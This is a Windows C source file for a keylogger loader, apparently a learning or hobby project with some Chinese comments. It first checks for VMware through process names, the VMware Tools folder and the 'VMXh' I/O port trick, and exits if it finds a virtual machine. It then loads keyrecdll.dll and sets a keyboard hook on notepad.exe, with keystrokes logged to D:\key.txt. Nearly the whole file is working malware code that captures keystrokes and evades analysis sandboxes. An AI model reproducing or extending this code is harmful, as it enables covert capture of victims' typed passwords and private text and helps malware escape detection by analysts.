#include <windows.h>
#include <stdio.h> 
#include <tchar.h>
#include <Psapi.h>
#pragma comment(lib,"Psapi.lib")
#include <shlwapi.h>
#pragma   comment(lib,"shlwapi.lib")
#include <tlhelp32.h>

/*
如果修改如下信息，需要重新编译：
    锁定程序文件名
    记录文件路径
    dll文件名
*/

HANDLE hDesProcess = NULL;
const LPCTSTR lpszProcessName = _T("notepad.exe"); //target program to record input key

DWORD FindProcess(LPCTSTR ProcessName){
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD dwThreadId = 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    BOOL fOk;
    for (fOk = Process32First(hSnapshot, &pe); fOk; fOk = Process32Next(hSnapshot, &pe)){
        if (!_tcscmp(pe.szExeFile, ProcessName)){
            // printf("Succeed: Get Thread ID: %ld\n",pe.th32ProcessID);
            dwThreadId = pe.th32ProcessID;
        }
    
    }
    CloseHandle(hSnapshot);
    // if (dwThreadId = 0)
    //     printf("Error: Thread ID not found.\n");
    return dwThreadId;
}

bool DetectVM(){
    //查看当前运行的进程
    if(FindProcess((LPCTSTR)"vmtoolsd.exe") || FindProcess((LPCTSTR)"vmacthlp.exe")){
        printf("Find VM process\n");
        return true;
    }
    //查看注册表xx
    //查看vmtool程序路径
    if(PathIsDirectory((LPCTSTR)"C:\\Program Files\\VMware\\VMware Tools\\")){
        printf("Find VMtool folder\n");
        return true;
    }

    /* in */
    bool is_VM = true;
    ULONG VM_ver = 0;
    __try{
        __asm{
            push   edx
            push   ecx
            push   ebx 
            mov    eax, 'VMXh'
            mov    ebx, 0   //用于存放VMware所有响应的内存地址
            mov    ecx, 0xa //获取VMware版本，若为0x14则get the memory size
            mov    edx, 'VX'//为in指令指定VMware I/O通信端口
            in     eax, dx 
            cmp    ebx, 'VMXh' 
            setz   [is_VM] 
            mov    [VM_ver], ecx
            pop    ebx
            pop    ecx
            pop    edx
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER){
        ;
    }
    if(is_VM){
        printf("I/O works\n");
        return true;
    }

    return false;

    /* No Pill */
    // ULONG xdt = 0 ;
    // ULONG InVM = 0;
    // __asm{
    //     push edx
    //     sidt [esp-2]
    //     pop edx
    //     nop
    //     mov xdt , edx
    // }
    // if (xdt > 0xd0000000){
    //     InVM = 1;
    // }
    // else{
    //     InVM = 0;
    // }
    // __asm{
    //     push edx
    //     sgdt [esp-2]
    //     pop edx
    //     nop
    //     mov xdt , edx
    // }
    // if(xdt > 0xd0000000){
    //     InVM += 1;
    // }
    // if(InVM == 0){
    //     return FALSE;
    // }
    // else{
    //     printf("No Pills work\n");
    //     return TRUE;
    // }

    /* str */
    // unsigned char mem[4] = {0};
    // __asm str mem;
    // printf("%s\n", mem);
    // if ((mem[0] == 0x00) && (mem[1] == 0x40)){
    //     printf("str works\n");
    //     return TRUE;
    // }
    // else{
    //     return FALSE;
    // }
}

int main(){
    printf("Start\n");
    if(DetectVM() == true){
        printf("running in VM, exiting\n");
        return 1;
    }

    //读取DLL及其中的函数
    HMODULE hMod = LoadLibraryA("keyrecdll.dll");
    if(!hMod){
        printf("Load DLL fail");
        return FALSE;
    }
    
    DWORD lpFunc = (DWORD)GetProcAddress(hMod, "?MyHook@@YGJHIJ@Z");
    if(!lpFunc){
        if(hMod) 
            FreeLibrary(hMod);
        printf("Error: Load DLL function FAIL!\n");
        return FALSE;
    }
    
    //
    
    DWORD ThreadId = FindProcess(lpszProcessName);

    HHOOK hhook = SetWindowsHookEx(
    WH_KEYBOARD,//WH_KEYBOARD,//WH_CALLWNDPROC,
    (HOOKPROC)lpFunc,
    hMod,
    ThreadId);
    
    printf("Hook Sueecss!\n Output: D:\\key.txt");
    
    while(1){
    }
    
    return 0;
}

